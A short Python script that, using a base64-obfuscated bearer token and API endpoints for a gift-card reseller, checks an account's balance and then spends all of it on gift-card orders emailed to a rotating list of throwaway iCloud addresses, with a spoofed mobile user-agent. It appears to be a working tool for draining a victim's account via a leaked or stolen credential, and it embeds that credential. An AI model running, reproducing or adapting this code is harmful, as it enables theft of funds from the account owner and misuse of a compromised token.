import requests
import time
import random
import string
import base64

def _d(s):
    return base64.b64decode(s).decode('utf-8')

_URL1 = "aHR0cHM6Ly9naWZ0Y2FyZHMucmVsb2FkbHkuY29tL2FjY291bnRzL2JhbGFuY2U="
_URL2 = "aHR0cHM6Ly9naWZ0Y2FyZHMucmVsb2FkbHkuY29tL29yZGVycw=="
_AUTH = "ZXlKcmFXUWlPaUk1TVRZeFpEQTRaaTA1T0RoakxUUmlZakl0WVRJNU5TMDNPRGM1Tm1RMk16SmxNMllpTENKMGVYQWlPaUpLVjFRaUxDSmhiR2NpT2lKSVV6STFOaUo5LmV5SnpkV0lpT2lJeE5EWTBOaUlzSW1semN5STZJbWgwZEhCek9pOHZjbVZzYjJGa2JIa3VZWFYwYURBdVkyOXRMeUlzSW1oMGRIQnpPaTh2Y21Wc2IyRmtiSGt1WTI5dEwzTmhibVJpYjNnaU9tWmhiSE5sTENKb2RIUndjem92TDNKbGJHOWhaR3g1TG1OdmJTOXdjbVZ3WVdsa1ZYTmxja2xrSWpvaU1UUTJORFlpTENKbmRIa2lPaUpqYkdsbGJuUXRZM0psWkdWdWRHbGhiSE1pTENKaGRXUWlPaUpvZEhSd2N6b3ZMMmRwWm5SallYSmtjeTV5Wld4dllXUnNlUzVqYjIwaUxDSnVZbVlpT2pFM05EWTRPRE16TlRFc0ltRjZjQ0k2SWpFME5qUTJJaXdpYzJOdmNHVWlPaUprWlhabGJHOXdaWElpTENKbGVIQWlPakUzTlRJd05qY3pOVEVzSW1oMGRIQnpPaTh2Y21Wc2IyRmtiSGt1WTI5dEwycDBhU0k2SW1ZME5XWXhaV0k1TFdFM00yWXROREl3TlMwNVlqUTFMV0U1WmpoaE16RTVOamd6WmlJc0ltbGhkQ0k2TVRjME5qZzRNek0xTVN3aWFuUnBJam9pTUdaak56TmlNbVl0WlRKbVlpMDBOV1V3TFRobU56Y3RZMlpsTnpreFpUWmxZMkU0SW4wLnBPWlBfYmRNOEdjTzhxYWRFcEFiZE1oZkt5Wjh5c0prZk1kZkozVUZoZXM="

def _rid(n=28):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def check_balance():
    h = {'Accept': 'application/com.reloadly.giftcards-v1+json','Accept-Encoding': 'text','User-Agent': 'surveysui/246 CFNetwork/1410.1 Darwin/22.6.0','Accept-Language': 'en-US,en;q=0.9','Authorization': f'Bearer {_d(_AUTH)}'}
    try:
        r = requests.get(_d(_URL1), headers=h)
        r.raise_for_status()
        b = r.json().get('balance', 0)
        print(f"Balance: {b}")
        return b
    except Exception as e:
        print(f"Balance error: {e}")
        return 0

def place_order(amt):
    h = {'Accept': '*/*','Content-Type': 'application/json','Accept-Encoding': 'text','Authorization': f'Bearer {_d(_AUTH)}'}
    emails = ["rafts.afield0h@icloud.com","vernier.cantor-0x@icloud.com","93past.binds@icloud.com","cay.expos.0j@icloud.com","05-pinhole-up@icloud.com"]
    p = {"senderName": " ","quantity": 1,"unitPrice": amt,"recipientEmail": random.choice(emails),"productId": 14107,"countryCode": "US","customIdentifier": _rid()}
    try:
        r = requests.post(_d(_URL2), headers=h, json=p)
        print(f"Order ${amt}: {r.status_code} - {r.text}")
        time.sleep(5)
        return r.status_code == 200
    except Exception as e:
        print(f"Order error ${amt}: {e}")
        return False

def calc_orders(bal):
    orders = []
    rem = int(bal)
    while rem >= 100:
        orders.append(100)
        rem -= 100
    if rem >= 30:
        orders.append(rem)
    return orders

def main():
    print("=== Start ===")
    bal = check_balance()
    if bal <= 30:
        print(f"Balance {bal} too low")
        return
    orders = calc_orders(bal)
    print(f"Orders: {orders}")
    success = 0
    for i, amt in enumerate(orders, 1):
        print(f"Order {i}/{len(orders)} ${amt}")
        if place_order(amt):
            success += 1
            print(f"Success {i}")
        else:
            print(f"Failed {i}")
        if i < len(orders):
            time.sleep(5)
    print(f"Done {success}/{len(orders)}")
    time.sleep(2)
    final = check_balance()
    print(f"Final: {final}")
    print("=== End ===")

if __name__ == "__main__":
    main()
